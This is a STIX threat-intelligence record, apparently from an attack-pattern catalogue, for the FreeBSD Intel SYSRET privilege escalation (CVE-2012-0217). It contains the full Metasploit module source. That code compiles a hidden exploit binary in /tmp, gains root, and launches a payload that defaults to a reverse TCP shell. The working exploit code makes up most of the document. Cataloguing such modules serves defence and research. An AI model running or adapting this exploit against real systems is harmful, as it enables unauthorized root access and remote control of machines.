{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--0c3d91b6-03df-4070-bf90-3bf2b24a5bd0",
    "created": "2024-08-14T16:33:34.115644Z",
    "modified": "2024-08-14T16:33:34.115648Z",
    "name": "FreeBSD Intel SYSRET Privilege Escalation",
    "description": " This module exploits a vulnerability in the FreeBSD kernel when running on 64-bit Intel processors.  By design, 64-bit processors following the X86-64 specification will trigger a general protection fault (GPF) when executing a SYSRET instruction with a non-canonical address in the RCX register.  However, Intel processors check for a non-canonical address prior to dropping privileges, causing a GPF in privileged mode. As a result the current userland RSP stack pointer is restored and executed resulting in privileged code execution.  This module has been tested successfully on:  FreeBSD 8.3-RELEASE (amd64); and FreeBSD 9.0-RELEASE (amd64).  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/freebsd/local/intel_sysret_priv_esc.rb",
            "external_id": "intel_sysret_priv_esc.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2012-0217"
        },
        {
            "source_name": "reference",
            "url": "https://www.freebsd.org/security/patches/SA-12:04/sysret.patch"
        },
        {
            "source_name": "reference",
            "url": "https://blog.xenproject.org/2012/06/13/the-intel-sysret-privilege-escalation/"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/iZsh/exploits/blob/master/stash/CVE-2012-0217-sysret/CVE-2012-0217-sysret_FreeBSD.c"
        },
        {
            "source_name": "reference",
            "url": "https://fail0verflow.com/blog/2012/cve-2012-0217-intel-sysret-freebsd/"
        },
        {
            "source_name": "reference",
            "url": "http://security.freebsd.org/advisories/FreeBSD-SA-12:04.sysret.asc"
        },
        {
            "source_name": "reference",
            "url": "https://www.slideshare.net/nkslides/exploiting-the-linux-kernel-via-intels-sysret-implementation"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Local\n  Rank = GreatRanking\n\n  prepend Msf::Exploit::Remote::AutoCheck\n  include Msf::Post::File\n  include Msf::Post::Unix\n  include Msf::Exploit::EXE\n  include Msf::Exploit::FileDropper\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'FreeBSD Intel SYSRET Privilege Escalation',\n        'Description' => %q{\n          This module exploits a vulnerability in the FreeBSD kernel,\n          when running on 64-bit Intel processors.\n\n          By design, 64-bit processors following the X86-64 specification will\n          trigger a general protection fault (GPF) when executing a SYSRET\n          instruction with a non-canonical address in the RCX register.\n\n          However, Intel processors check for a non-canonical address prior to\n          dropping privileges, causing a GPF in privileged mode. As a result,\n          the current userland RSP stack pointer is restored and executed,\n          resulting in privileged code execution.\n\n          This module has been tested successfully on:\n\n          FreeBSD 8.3-RELEASE (amd64); and\n          FreeBSD 9.0-RELEASE (amd64).\n        },\n        'License' => MSF_LICENSE,\n        'Author' =>\n          [\n            'Rafal Wojtczuk', # Discovery\n            'John Baldwin', # Discovery\n            'iZsh', # Exploit\n            'bcoles' # Metasploit\n          ],\n        'DisclosureDate' => '2012-06-12',\n        'Platform' => ['bsd'], # FreeBSD\n        'Arch' => [ARCH_X64],\n        'SessionTypes' => ['shell'],\n        'References' =>\n          [\n            ['BID', '53856'],\n            ['CVE', '2012-0217'],\n            ['EDB', '28718'],\n            ['PACKETSTORM', '113584'],\n            ['URL', 'https://www.freebsd.org/security/patches/SA-12:04/sysret.patch'],\n            ['URL', 'https://blog.xenproject.org/2012/06/13/the-intel-sysret-privilege-escalation/'],\n            ['URL', 'https://github.com/iZsh/exploits/blob/master/stash/CVE-2012-0217-sysret/CVE-2012-0217-sysret_FreeBSD.c'],\n            ['URL', 'https://fail0verflow.com/blog/2012/cve-2012-0217-intel-sysret-freebsd/'],\n            ['URL', 'http://security.freebsd.org/advisories/FreeBSD-SA-12:04.sysret.asc'],\n            ['URL', 'https://www.slideshare.net/nkslides/exploiting-the-linux-kernel-via-intels-sysret-implementation']\n          ],\n        'Targets' =>\n          [\n            ['Automatic', {}]\n          ],\n        'DefaultOptions' => { 'PAYLOAD' => 'bsd/x64/shell_reverse_tcp' },\n        'DefaultTarget' => 0\n      )\n    )\n    register_advanced_options([\n      OptString.new('WritableDir', [true, 'A directory where we can write files', '/tmp'])\n    ])\n  end\n\n  def base_dir\n    datastore['WritableDir'].to_s\n  end\n\n  def upload(path, data)\n    print_status(\"Writing '#{path}' (#{data.size} bytes) ...\")\n    rm_f(path)\n    write_file(path, data)\n    register_file_for_cleanup(path)\n  end\n\n  def upload_and_compile(path, data, _cc_args = '')\n    upload(\"#{path}.c\", data)\n\n    cc_cmd = \"cc -o #{path} #{path}.c\"\n    if session.type.eql?('shell')\n      cc_cmd = \"PATH=$PATH:/usr/bin/ #{cc_cmd}\"\n    end\n    output = cmd_exec(cc_cmd)\n\n    unless output.blank?\n      print_error(output)\n      fail_with(Failure::Unknown, \"#{path}.c failed to compile\")\n    end\n\n    register_file_for_cleanup(path)\n    chmod(path)\n  end\n\n  def strip_comments(c_code)\n    c_code.gsub(%r{/\\*.*?\\*/}m, '').gsub(%r{^\\s*//.*$}, '')\n  end\n\n  def check\n    kernel_release = cmd_exec('uname -r').to_s\n    unless kernel_release =~ /^(8\\.3|9\\.0)-RELEASE/\n      return CheckCode::Safe(\"FreeBSD version #{kernel_release} is not vulnerable\")\n    end\n    vprint_good(\"FreeBSD version #{kernel_release} appears vulnerable\")\n\n    kernel_arch = cmd_exec('uname -m').to_s\n    unless kernel_arch.include?('64')\n      return CheckCode::Safe(\"System architecture #{kernel_arch} is not supported\")\n    end\n    vprint_good(\"System architecture #{kernel_arch} is supported\")\n\n    hw_model = cmd_exec('/sbin/sysctl hw.model').to_s\n    unless hw_model.downcase.include?('intel')\n      return CheckCode::Safe(\"#{hw_model} is not vulnerable\")\n    end\n    vprint_good(\"#{hw_model} is vulnerable\")\n\n    CheckCode::Appears\n  end\n\n  def exploit\n    if !datastore['ForceExploit'] && is_root?\n      fail_with(Failure::BadConfig, 'Session already has root privileges. Set ForceExploit to override.')\n    end\n\n    unless writable?(base_dir)\n      fail_with(Failure::BadConfig, \"#{base_dir} is not writable\")\n    end\n\n    # Upload and compile exploit executable\n    executable_name = \".#{rand_text_alphanumeric(5..10)}\"\n    executable_path = \"#{base_dir}/#{executable_name}\"\n    upload_and_compile(executable_path, strip_comments(exploit_data('cve-2012-0217', 'sysret.c')), '-Wall')\n\n    # Upload payload executable\n    payload_path = \"#{base_dir}/.#{rand_text_alphanumeric(5..10)}\"\n    upload_and_chmodx(payload_path, generate_payload_exe)\n\n    # Launch exploit\n    print_status('Launching exploit...')\n    output = cmd_exec(executable_path)\n    output.each_line { |line| vprint_status line.chomp }\n\n    unless is_root?\n      fail_with(Failure::Unknown, 'Exploitation failed')\n    end\n    print_good('Success! Executing payload...')\n\n    cmd_exec(\"#{payload_path} & echo \")\n  end\nend\n",
    "x_mitre_disclosure_date": "2012-06-12",
    "x_mitre_platforms": [
        "['bsd'], # FreeBSD"
    ]
}